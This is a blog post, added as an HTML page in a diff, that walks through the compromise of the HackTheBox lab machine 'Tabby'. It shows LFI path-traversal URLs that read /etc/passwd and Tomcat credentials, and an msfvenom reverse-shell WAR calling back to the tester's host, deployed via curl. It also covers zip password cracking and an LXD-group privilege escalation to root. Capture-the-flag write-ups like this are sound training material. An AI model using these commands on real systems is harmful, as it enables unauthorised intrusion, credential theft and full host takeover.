@@ -1,0 +1,252 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Tabby // SixPraxis</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="SixPraxis" />
+    <meta name="description" content="Write Up for HackTheBox&#39;s Tabby" />
+    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.86a2007e438a83c7fd8ff3ced81470ea9a72de62cbb2749eb6c16813ce7eadcb.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Tabby"/>
+<meta name="twitter:description" content="Write Up for HackTheBox&#39;s Tabby"/>
+
+    <meta property="og:title" content="HTB - Tabby" />
+<meta property="og:description" content="Write Up for HackTheBox&#39;s Tabby" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sixpraxis.github.io/posts/tabby/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-06T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-04-06T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
+      <h1>SixPraxis</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
+  <title>HackTheBox</title>
+  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Tabby</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 6, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/tabby/">tabby</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/easy/">easy</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><img src="/images/htb-tabby/tabby.png" alt=""></p>
+<h1 id="tabby">Tabby</h1>
+<h4 id="101010194">10.10.10.194</h4>
+<h5 id="by-sixpraxis">by SixPraxis</h5>
+<h3 id="write-up">Write-Up</h3>
+<p>Initial nmap scans revealed three ports, two of which were running HTTP services, the other being SSH. A server rental website resided on port 80 and Apache Tomcat 9 on port 8080. Investigating the site on port 80 revealed that news.php contained an LFI vulnerability. Tests successfully accessed /etc/passwd by requesting <code>http://target.htb/news.php?file=../../../../../../../../etc/passwd</code>. No further vulnerabilities were found on port 80.</p>
+<p>Port 8080 displayed the default page for Tomcat, listing internal paths to configuration files and links to the manager web interfaces used to manage the installation. The installed version, v9.0.31, falls under CVE-2020-9484 which allows for remote code execution under certain conditions. To enable those conditions gaining access to the manager interfaces was required. Credentials for the manager interfaces on Tomcat are stored in the tomcat-users.xml file and the LFI vulnerability from port 80 provided a gateway to it. Installing tomcat on a seperate VM provided a layout of the file structure and possible paths to the xml. Using curl to test the possible paths yielded the credentials <code>tomcat : $3cureP4s5w0rd123!</code>.</p>
+<pre><code>http://target.htb/news.php?file=../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+</code></pre><p>Permissions on the tomcat user account granted access to the text version of the manager interface, which provides commands to upload files to the server. The upload command only supports files in the war format, so msfvenom was used to create a reverse shell payload in the proper format.</p>
+<p><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.19 LPORT=4040 -f war -o gunship.war</code></p>
+<p>curl was used to upload our war file:</p>
+<pre><code>curl -T gunship.war --user tomcat:$TOMCATPASS http://target.htb:8080/manager/text/deploy?path=/gunshipshell
+
+OK - Deployed application at context path [/gunshipshell]
+</code></pre><p>The war file was extracted to find the name of the jsp inside, a listener was setup, then a request was made to <a href="http://target.htb/gunshipshell/tjcfpqknm.jsp">http://target.htb/gunshipshell/tjcfpqknm.jsp</a> and a shell connection was established as tomcat. The command <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> was used to upgrade the shell. A password protected archive, 16162020_backup.zip, was found and downloaded from the /var/www/html/files directory. A dictionary attack using fcrackzip and the rockyou word list quickly uncovered the password as <code>admin@it</code>. The same password was used for the ash user on the system, <code>su ash</code> granted access to the user flag in the ash home directory.</p>
+<p><img src="/images/htb-tabby/userflag.png" alt=""></p>
+<p>LinEnum.sh was downloaded onto the system and run. It indicated that the ash user was a part of the LXC group, which is a widely known security vulnerability. The LXC service runs as root and allows mounting of protected files and directories into a VM, which the user can be root inside of, effectively giving them root on the host system. An image of a lightweight linux distribution was created on the tester&rsquo;s machine and downloaded to the target&rsquo;s tmp directory.</p>
+<pre><code>On the attacker's machine:
+sudo git clone https://github.com/saghul/lxd-alpine-builder
+sudo ./build-alpine -a i686
+</code></pre><p>The image was then imported into LXC and initiated with the security.privileged flag set to true, which allows for root to be used inside of the VM. Then the root folder of the host was mounted into the image, abusing the fact that the LXC service is running with root permissions on the target machine. The container/VM was then started and accessed. The attacker navigated to the mounted root directory and has the ability to access or modify any of the contents.</p>
+<pre><code>On the target machine:
+lxc image import ./alpine.tar.gz --alias myimage
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+
+cd /mnt/root/
+cat root.txt
+a8567c3deb23f41a2b7fd58474911312
+</code></pre><hr>
+<h3 id="recon">Recon</h3>
+<h4 id="nmap">NMAP</h4>
+<pre><code>Nmap scan report for 10.10.10.194
+Host is up (0.047s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+8080/tcp open  http    Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h5 id="port-80">Port 80</h5>
+<p>Mega Hosting dedicated server rentals.</p>
+<p><strong>Wfuzz:</strong></p>
+<pre><code>http://target.htb/FUZZFUZ2Z
+000002101:   403        9 L      28 W     275 Ch      &quot;assets - /&quot;                   
+000009521:   403        9 L      28 W     275 Ch      &quot;files - /&quot;                    
+000011425:   403        9 L      28 W     275 Ch      &quot;icons - /&quot;                    
+000011780:   200        373 L    938 W    14175 Ch    &quot;index - .php&quot;                 
+000015560:   200        0 L      0 W      0 Ch        &quot;news - .php&quot;
+</code></pre><pre><code>http://target.htb/files/FUZZFUZ2Z
+000001961:   403        9 L      28 W     275 Ch      &quot;archive - /&quot;                  
+</code></pre><p>Nothing further found in the archive directory.</p>
+<p><strong>LFI vuln:</strong></p>
+<p><a href="http://target.htb/news.php?file=">http://target.htb/news.php?file=</a> contains an LFI vulnerability. Successfully pulled /etc/passwd by requesting:</p>
+<p><code>http://target.htb/news.php?file=../../../../../../../../etc/passwd</code></p>
+<h5 id="port-8080">Port 8080</h5>
+<p>Appears to be a default Apache Tomcat 9 landing page. Lots of useful information.</p>
+<ul>
+<li>Local filesystem at: <code>/var/lib/tomcat9/webapps/ROOT/index.html</code></li>
+<li>following the rules from <code>/usr/share/doc/tomcat9-common/RUNNING.txt.gz</code></li>
+<li>Manager webapp: <a href="http://target.htb:8080/manager/html">http://target.htb:8080/manager/html</a></li>
+<li>Host manager webapp: <a href="http://target.htb:8080/host-manager/html">http://target.htb:8080/host-manager/html</a></li>
+<li>Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code></li>
+<li>Version 9.0.31</li>
+</ul>
+<p>CVE-2020-9484 (RCE) may be possible. Both manager apps have been changed from the default Tomcat credentials.</p>
+<hr>
+<h3 id="credentials">Credentials</h3>
+<p><strong>ash user</strong> - Password: admin@it</p>
+<p><a href="http://target.htb/news.php?file=../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml">http://target.htb/news.php?file=../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml</a></p>
+<pre><code>   &lt;role rolename=&quot;admin-gui&quot;/&gt;
+   &lt;role rolename=&quot;manager-script&quot;/&gt;
+   &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;
+</code></pre><p><strong>16162020_backup.zip</strong>  - Password: admin@it</p>
+<p><strong>User Flag</strong>: 006aa6360fef41d186de3d950fc60e3d</p>
+<hr>
+<h5 id="notes">Notes</h5>
+<p><strong>Text manager command format</strong></p>
+<p><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p>
+<p><strong><a href="http://target.htb/news.php?file=../../../../../../../../../../../lib/systemd/system/tomcat9.service">http://target.htb/news.php?file=../../../../../../../../../../../lib/systemd/system/tomcat9.service</a></strong></p>
+<pre><code># # Systemd unit file for Apache Tomcat # 
+[Unit] Description=Apache Tomcat 9 Web Application Server 
+Documentation=https://tomcat.apache.org/tomcat-9.0-doc/index.html 
+After=network.target 
+RequiresMountsFor=/var/log/tomcat9 /var/lib/tomcat9 [Service] 
+# Configuration 
+Environment=&quot;CATALINA_HOME=/usr/share/tomcat9&quot; 
+Environment=&quot;CATALINA_BASE=/var/lib/tomcat9&quot; 
+Environment=&quot;CATALINA_TMPDIR=/tmp&quot; 
+Environment=&quot;JAVA_OPTS=-Djava.awt.headless=true&quot; 
+# Lifecycle 
+Type=simple 
+ExecStartPre=+/usr/libexec/tomcat9/tomcat-update-policy.sh 
+ExecStart=/bin/sh /usr/libexec/tomcat9/tomcat-start.sh 
+SuccessExitStatus=143 
+Restart=on-abort 
+# Logging 
+SyslogIdentifier=tomcat9 
+# Security 
+User=tomcat 
+Group=tomcat 
+PrivateTmp=yes 
+AmbientCapabilities=CAP_NET_BIND_SERVICE 
+NoNewPrivileges=false 
+CacheDirectory=tomcat9 
+CacheDirectoryMode=750 
+ProtectSystem=strict 
+ReadWritePaths=/etc/tomcat9/Catalina/ 
+ReadWritePaths=/var/lib/tomcat9/webapps/ 
+ReadWritePaths=/var/log/tomcat9/ 
+[Install] 
+WantedBy=multi-user.target 
+</code></pre><p><strong>/etc/passwd</strong></p>
+<pre><code>root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin 
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin 
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false 
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin 
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin 
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin 
+pollinate:x:110:1::/var/cache/pollinate:/bin/false 
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false 
+tomcat:x:997:997::/opt/tomcat:/bin/false 
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false 
+ash:x:1000:1000:clive:/home/ash:/bin/bash
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
